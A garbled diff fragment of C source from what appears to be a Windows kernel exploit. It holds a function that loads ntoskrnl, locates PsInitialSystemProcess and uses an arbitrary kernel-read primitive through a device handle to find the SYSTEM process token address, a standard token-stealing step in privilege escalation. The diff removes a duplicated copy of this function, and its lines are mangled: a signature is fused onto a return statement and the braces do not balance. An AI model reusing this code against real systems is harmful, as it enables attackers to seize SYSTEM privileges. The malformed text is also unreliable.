@@ -1588,22 +1588,6 @@ QWORD GetSystemTokenAddress(QWORD kernelBase, HANDLE hDevice)
     FreeLibrary(hKernel);
 
     return systemTokenAddress;QWORD GetSystemTokenAddress(QWORD kernelBase, HANDLE hDevice)
-{
-    // Load kernel in to user land and get the PsInitialSystemProcess address
-    HMODULE hKernel = LoadLibraryA(NTOSKRNL_EXE);
-    HANDLE psInitialProcess = GetProcAddress(hKernel, "PsInitialSystemProcess");
-
-    QWORD psOffset = (QWORD)psInitialProcess - (QWORD)hKernel;
-    QWORD psAddress = (QWORD)kernelBase + (QWORD)psOffset;
-
-    QWORD dereferencedSystemEprocessAddress;
-    ArbitraryRead(hDevice, psAddress, (QWORD)&dereferencedSystemEprocessAddress);
-    printf("[+] SYSTEM _EPROCESS address: 0x%p\n", dereferencedSystemEprocessAddress);
-
-    QWORD systemTokenAddress = dereferencedSystemEprocessAddress + TOKEN_OFFSET;
-    FreeLibrary(hKernel);
-
-    return systemTokenAddress;
     }
 }
 ```
